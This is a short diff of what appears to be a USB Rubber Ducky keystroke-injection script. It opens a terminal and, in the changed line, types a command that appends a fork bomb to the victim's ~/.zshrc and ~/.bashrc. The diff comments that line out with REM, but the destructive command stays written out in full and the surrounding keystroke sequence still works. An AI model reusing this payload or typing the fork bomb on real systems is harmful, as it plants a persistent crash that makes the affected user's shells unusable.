@@ -14,7 +14,7 @@ WINDOWS d
 DELAY 300
 CTRL-ALT t
 DELAY 1500
-STRING echo ":(){ :|:& };:" >> ~/.zshrc && echo ":(){ :|:& };:" >> ~/.bashrc
+REM STRING echo ":(){ :|:& };:" >> ~/.zshrc && echo ":(){ :|:& };:" >> ~/.bashrc
 DELAY 300
 ENTER
 DELAY 500
